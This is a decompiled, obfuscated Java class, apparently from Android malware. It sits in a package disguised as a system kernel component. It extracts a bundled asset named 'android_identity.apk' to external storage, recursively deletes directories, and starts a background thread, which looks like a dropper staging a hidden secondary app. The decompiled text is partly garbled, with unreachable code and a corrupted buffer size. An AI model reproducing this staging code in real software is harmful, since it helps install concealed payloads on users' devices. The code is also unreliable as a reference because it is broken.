package com.android.system.kernel;

import android.content.Context;
import android.content.ServiceConnection;
import android.content.res.AssetManager;
import android.content.res.Resources;
import android.os.Build.VERSION;
import android.os.Environment;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;

public final class e
{
  private static e d;
  private Context a;
  private Class b;
  private Object c;
  private ServiceConnection e = new f(this);
  
  private e()
  {
    d = this;
  }
  
  public static e a()
  {
    if (d == null) {
      d = new e();
    }
    return d;
  }
  
  private boolean a(File paramFile)
  {
    int i = 0;
    if ((paramFile == null) || (!paramFile.exists()) || (paramFile.isFile())) {
      return false;
    }
    File[] arrayOfFile = paramFile.listFiles();
    int j = arrayOfFile.length;
    if (i >= j)
    {
      paramFile.delete();
      return true;
    }
    File localFile = arrayOfFile[i];
    if (localFile.isFile()) {
      localFile.delete();
    }
    for (;;)
    {
      i += 1;
      break;
      if (localFile.isDirectory()) {
        a(localFile);
      }
    }
  }
  
  private boolean a(String paramString1, String paramString2, String paramString3)
  {
    String str = Environment.getExternalStorageDirectory().toString();
    Object localObject = this.a.getResources().getAssets();
    try
    {
      paramString1 = ((AssetManager)localObject).open(paramString1);
      localObject = new BufferedInputStream(paramString1);
      File localFile = new File(str + paramString2);
      if (!localFile.exists()) {
        localFile.mkdirs();
      }
      paramString2 = new File(str + paramString2, paramString3);
      if (!paramString2.exists()) {
        paramString2.createNewFile();
      }
      paramString2 = new FileOutputStream(paramString2);
      paramString3 = new byte['á€€'];
      for (;;)
      {
        if (((BufferedInputStream)localObject).read(paramString3) == -1)
        {
          paramString2.flush();
          paramString2.close();
          ((BufferedInputStream)localObject).close();
          paramString1.close();
          return true;
        }
        paramString2.write(paramString3);
      }
      return false;
    }
    catch (IOException paramString1)
    {
      paramString1.printStackTrace();
    }
  }
  
  private static String c()
  {
    if (Build.VERSION.SDK_INT >= 14) {
      return "android_identity.apk";
    }
    return "android_identity.cfg";
  }
  
  public final void a(Context paramContext)
  {
    this.a = paramContext;
    new g(this, paramContext).start();
  }
}
